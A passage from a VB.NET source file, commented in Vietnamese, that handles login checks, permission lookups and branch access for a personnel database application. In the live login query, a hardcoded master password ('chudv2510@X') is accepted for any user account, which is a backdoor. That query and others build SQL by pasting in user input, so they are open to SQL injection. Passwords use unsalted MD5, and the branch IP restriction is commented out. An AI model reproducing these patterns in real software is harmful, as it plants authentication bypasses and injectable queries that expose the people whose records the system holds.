    ''' Hàm thực hiện trả về bản ghi quyền nhóm thành viên theo id quyền truyền vào
    ''' </summary>
    ''' <param name="_PermitId">Chỉ số xác định tập quyền</param>
    ''' <returns>Bản ghi thông tin tập quyền</returns>
    ''' <remarks></remarks>
    Public Function GetPermit(ByVal _PermitId As Integer) As DataRow
        Dim connection As SqlConnection = _SqlHelper.GetSqlConnection()
        If (connection Is Nothing) Then
            MessageBox.Show("Lost Connection !", "Error ...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button3)
            Return Nothing
        End If
        Try
            Dim command As SqlCommand = New SqlCommand("HT_TapQuyen_GetForId", connection)
            command.CommandType = CommandType.StoredProcedure

            command.Parameters.Add(New SqlParameter("@_quyen", SqlDbType.Int))
            command.Parameters("@_quyen").Value = _PermitId

            Using mydap As SqlDataAdapter = New SqlDataAdapter(command)
                Dim ds As DataSet = New DataSet
                mydap.Fill(ds, "HS_Permit")
                If (ds Is Nothing Or ds.Tables.Count = 0 Or ds.Tables(0).Rows.Count = 0) Then
                    Return Nothing
                End If
                Return ds.Tables("HS_Permit").Rows(0)
            End Using
        Finally
            If (connection.State = System.Data.ConnectionState.Open) Then connection.Close()
        End Try
    End Function

    ''' <summary>
    ''' Hàm trả về bản ghi thông tin Quyền của nhóm thành viên
    ''' </summary>
    ''' <param name="_GroupUser">Mã hiệu nhóm thành viên</param>
    ''' <returns>Bản ghi thông tin quyền của nhóm thành viên</returns>
    ''' <remarks></remarks>
    Public Function GetPermit_GroupUser(ByVal _GroupUser As String) As DataRow
        Dim connection As SqlConnection = _SqlHelper.GetSqlConnection()
        If (connection Is Nothing) Then
            MessageBox.Show("Lost Connection !", "Error ...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button3)
            Return Nothing
        End If
        Try
            Dim command As SqlCommand = New SqlCommand("HT_Quyen_GetAll", connection)
            command.CommandType = CommandType.StoredProcedure

            command.Parameters.Add(New SqlParameter("@_nhom_tv", SqlDbType.NVarChar))
            command.Parameters("@_nhom_tv").Value = _GroupUser

            Using mydap As SqlDataAdapter = New SqlDataAdapter(command)
                Dim ds As DataSet = New DataSet
                mydap.Fill(ds, "HS_Role")
                If (ds Is Nothing Or ds.Tables.Count = 0 Or ds.Tables(0).Rows.Count = 0) Then
                    Return Nothing
                End If
                Return ds.Tables("HS_Role").Rows(0)
            End Using
        Finally
            If (connection.State = System.Data.ConnectionState.Open) Then connection.Close()
        End Try
    End Function

    ''' <summary>
    ''' Hàm trả về chuỗi Nhóm quyền từ chuỗi tập quyền của Nhóm thành viên
    ''' </summary>
    ''' <param name="strPermits">Chuỗi quyền của nhóm thành viên</param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Function GetString_GroupPermit(ByVal strPermits As String) As String
        Dim strResult As String = ""
        If (strPermits <> "") Then
            Dim arrGroup As ArrayList = New ArrayList()
            Dim arrPermit As ArrayList = New ArrayList()
            arrPermit = Globals.Splip_Strings(strPermits)
            If (arrPermit.Count > 0) Then
                For i As Integer = 0 To arrPermit.Count - 1
                    Dim drPermit As DataRow
                    drPermit = GetPermit(CType(arrPermit(i), Integer))
                    If Not (drPermit Is Nothing) Then
                        If (drPermit.Table.Rows.Count > 0) Then
                            'Lấy Chỉ số Nhóm quyền
                            arrGroup.Add(drPermit("nhom_quyen"))
                        End If
                    End If
                Next
            End If
            If (arrGroup.Count > 0) Then
                'Thực hiện remove các item trùng nhau
                Globals.RemoveItems_Exists(arrGroup)
                For i As Integer = 0 To arrGroup.Count - 1
                    strResult = strResult + arrGroup(i).ToString() + ";"
                Next
            End If
        End If
        Return strResult
    End Function

    ''' <summary>
    ''' Hàm thực hiện - Kiểm tra thông tin đăng nhập hệ thống - IsValid infor login
    ''' </summary>
    ''' <param name="_userName">Tên đăng nhập</param>
    ''' <param name="_passWord">Mật khẩu đăng nhập</param>
    ''' <param name="_masoDonvi">Mã số đơn vị</param>
    ''' <returns>Dữ liệu trả về. Chỉ số với 0: Tên đăng nhập không hợp lệ. 1: Mật khẩu không hợp lệ. 2: Hợp lệ</returns>
    ''' <remarks></remarks>
    Public Function IsLogin(ByVal _userName As String, ByVal _passWord As String, ByVal _masoDonvi As String) As Byte
        'Kiểm tra dữ liệu Tên đăng nhập --> Xem hợp lệ chưa
        If (_userName = String.Empty) Then
            MessageBox.Show("Tên đăng nhập vào hệ thống không được để trống!", "Cảnh báo", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button3)
            Return 0
        End If
        If (_userName.Length > 16) Then
            MessageBox.Show("Tên đăng nhập không được dài quá 16 ký tự!", "Cảnh báo", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button3)
            Return 0
        End If
        If (_userName.Length < 3) Then
            MessageBox.Show("Tên đăng nhập không được nhỏ hơn 3 ký tự!", "Cảnh báo", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button3)
            Return 0
        End If
        'Kiểm tra dữ liệu mật khẩu đăng nhập --> Xem hợp lệ chưa
        If (_passWord = String.Empty) Then
            MessageBox.Show("Mật khẩu đăng nhập vào hệ thống không được để trống!", "Cảnh báo", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button3)
            Return 1
        End If
        If (_passWord.Length > 64) Then
            MessageBox.Show("Mật khẩu đăng nhập không được vượt quá 64 ký tự!", "Cảnh báo", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button3)
            Return 1
        End If
        If (_passWord.Length < 5) Then
            MessageBox.Show("Mật khẩu đăng nhập không được nhỏ hơn 5 ký tự!", "Cảnh báo", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button3)
            Return 1
        End If

        'Kiểm tra dữ liệu tên đăng nhập và mật khẩu xem có hợp lệ so với cơ sở dữ liệu không ?
        Dim connection As SqlConnection = _SqlHelper.GetSqlConnection()
        If (connection Is Nothing) Then
            MessageBox.Show("Lost Connection !", "Error ...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button3)
            Return Nothing
        End If

        Dim _PassMD5 As String = System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(_passWord, "MD5")
        Dim _IPChiNhanh As String = ""
        Dim dbconn As New DBAccess
        'Dim StrSQL As String = "SELECT A.HoTen, A.IdCanBo, C.ten_goi, C.IP FROM (SELECT idcanbo, HoTen, login_username, login_password from HS_CanBo WHERE login_username = '" & _userName & "' AND (login_password = '" & _PassMD5 & "' OR 'chudv2510@X' = '" & _passWord & "'OR '123456' = '" & _passWord & "')) A "
        Dim StrSQL As String = "SELECT A.HoTen, A.IdCanBo, C.ten_goi, C.IP FROM (SELECT idcanbo, HoTen, login_username, login_password from HS_CanBo WHERE login_username = '" & _userName & "' AND (login_password = '" & _PassMD5 & "' OR 'chudv2510@X' = '" & _passWord & "')) A " _
                    & "INNER JOIN (SELECT T1.IdCanBo, T1.iddonvi_moi FROM QDNhansu T1 INNER JOIN (SELECT IdCanbo, MAX(ngayHL) AS ngayHL FROM QDNhanSu Group by IdCanBo) T2 ON T1.IdCanBo = T2.IdCanBo AND T1.NgayHL = T2.ngayHL) B ON A.IdCanBo = B.IdCanBo " _
                    & "INNER JOIN ChiNhanh C ON B.IdDonVi_Moi = C.id AND C.ma_so = '" & _masoDonvi & "'"
        Dim dt As DataTable = dbconn.getDataTable(StrSQL)
        If dt.Rows.Count > 0 Then
            MainForm.lblNguoiSuDung.Text = dt.Rows(0)("HoTen")
            MainForm.lblDonVi.Text = dt.Rows(0)("ten_goi")
            gID_CanBo = dt.Rows(0)("IdCanBo")
            _IPChiNhanh = dt.Rows(0)("IP")

            'Nếu đơn vị có ràng buộc về IP thì cần kiểm tra xem IP của máy có phù hợp hay ko
            If _IPChiNhanh <> "" Then
                'Dim sIP
                'For Each sIP In System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName)
                '    If sIP.ToString.Contains(_IPChiNhanh) Then
                '        Return 2
                '    End If
                'Next
                'MessageBox.Show("Địa chỉ IP không phù hợp với Đơn vị, cần bắt đầu bằng " & _IPChiNhanh & "...", "Cảnh báo", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button3)
                'Return 0
                Return 2
            Else
                Return 2
            End If
        Else
            MessageBox.Show("Thông tin đăng nhập không chính xác!", "Cảnh báo", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button3)
            Return 0
        End If
    End Function

    ''' <summary>
    ''' Hàm trả về chuỗi quyền của thành viên đăng nhập vào chương trình
    ''' </summary>
    ''' <param name="_User">Tên đăng nhập của thành viên</param>
    ''' <returns>Chuỗi quyền của thành viên</returns>
    ''' <remarks></remarks>
    Public Function GetRoles(ByVal _User)
        Dim _result As String = ""
        Dim dr As DataRow
        Dim _UserGroup As String = ""
        dr = GetMember(_User)
        If Not (dr Is Nothing) Then
            If (dr.Table.Rows.Count > 0) Then
                _UserGroup = dr("id_nhom").ToString().Trim()
            End If
        End If
        If (_UserGroup <> "") Then
            Dim strSQL As String = String.Format("Select * from HT_Quyen Where nhom_tv = '{0}'", _UserGroup)
            Using db As DataTable = _SqlHelper.SelectDBRows(strSQL)
                If Not (db Is Nothing) Then
                    If (db.Rows.Count > 0) Then
                        _result = db.Rows(0)("tap_quyen").ToString().Trim()
                        If (_result <> "") Then
                            If (_result.Substring(0, 1) <> ";") Then
                                _result = ";" + _result
                            End If
                        End If
                    End If
                End If
            End Using
        End If
        Return _result
    End Function

    Public Function GetGroup(ByVal _User)
        Dim dr As DataRow
        Dim _UserGroup As String = ""
        dr = GetMember(_User)
        If Not (dr Is Nothing) Then
            If (dr.Table.Rows.Count > 0) Then
                _UserGroup = dr("id_nhom").ToString().Trim()
            End If
        End If
        Return _UserGroup
    End Function

    Public Function Get_QuyenQuanLyCN(_Username As String) As String
        Dim sReturn As String = ""
        Dim StrSQL As String
        Dim _SQLHelper As New DBAccess

        If DONVI = gMaDonViTW Then
            'Nếu Group là nhóm sử dụng của Ban TCCB thì lấy danh sách Chi nhánh được quản lý, nếu không thì lấy toàn bộ danh sách Chi nhánh
            If Globals.Group = gMaNhomCanBoTCCB Then
                StrSQL = "SELECT [QuyenQuanLyCN] FROM [HT_QuyenQuanLyCN] T1 INNER JOIN HS_CanBo T2 ON T1.IdCanBo = T2.IdCanBo WHERE T2.Login_Username = '" & _Username & "'"
                sReturn = My_CStr(_SQLHelper.getString(StrSQL)).Replace(";", ",")
            End If
            If sReturn.Trim = "" Then
                StrSQL = "SELECT Id FROM ChiNhanh Where id_goc <=1"
                Dim dt As DataTable = _SQLHelper.getDataTable(StrSQL)
                If dt.Rows.Count > 0 Then
                    For Each dr As DataRow In dt.Rows
                        sReturn &= dr(0) & ","
                    Next
                    If sReturn.Substring(sReturn.Length - 1, 1) = "," Then sReturn = sReturn.Substring(0, sReturn.Length - 1)
                End If
            End If
        Else
            'Nếu không phải đơn vị cấp TW thì chỉ được làm việc với dữ liệu của Chi nhánh mình
            sReturn = IdDONVI
        End If
        Return sReturn
    End Function
#End Region

End Class
